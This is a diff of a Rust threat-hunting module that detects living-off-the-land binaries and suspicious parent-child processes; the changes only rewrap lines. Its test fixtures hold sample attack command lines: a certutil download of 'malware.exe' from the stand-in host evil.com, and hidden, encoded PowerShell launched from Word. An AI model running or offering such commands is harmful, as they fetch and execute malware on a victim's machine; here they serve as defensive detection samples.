@@ -133,7 +133,10 @@ pub fn check_lolbins(event: &ProcessEvent) -> Option<HuntMatch> {
 }
 
 /// Check for suspicious parent-child process relationships
-pub fn check_suspicious_parent_child(parent: &ProcessEvent, child: &ProcessEvent) -> Option<HuntMatch> {
+pub fn check_suspicious_parent_child(
+    parent: &ProcessEvent,
+    child: &ProcessEvent,
+) -> Option<HuntMatch> {
     let parent_image = parent.image_path.to_lowercase();
     let child_image = child.image_path.to_lowercase();
 
@@ -216,7 +219,8 @@ mod tests {
             timestamp: Utc::now(),
             pid: 1234,
             parent_pid: 5678,
-            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
+            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                .to_string(),
             command_line: "powershell.exe -enc SGVsbG8gV29ybGQ=".to_string(),
             username: "testuser".to_string(),
         };
@@ -236,7 +240,8 @@ mod tests {
             pid: 2345,
             parent_pid: 6789,
             image_path: "C:\\Windows\\System32\\certutil.exe".to_string(),
-            command_line: "certutil.exe -urlcache -split -f http://evil.com/malware.exe".to_string(),
+            command_line: "certutil.exe -urlcache -split -f http://evil.com/malware.exe"
+                .to_string(),
             username: "testuser".to_string(),
         };
 
@@ -254,7 +259,8 @@ mod tests {
             timestamp: Utc::now(),
             pid: 3456,
             parent_pid: 7890,
-            image_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE".to_string(),
+            image_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+                .to_string(),
             command_line: "WINWORD.EXE document.docx".to_string(),
             username: "testuser".to_string(),
         };
@@ -264,7 +270,8 @@ mod tests {
             timestamp: Utc::now(),
             pid: 4567,
             parent_pid: 3456,
-            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
+            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                .to_string(),
             command_line: "powershell.exe -w hidden -enc SGVsbG8=".to_string(),
             username: "testuser".to_string(),
         };
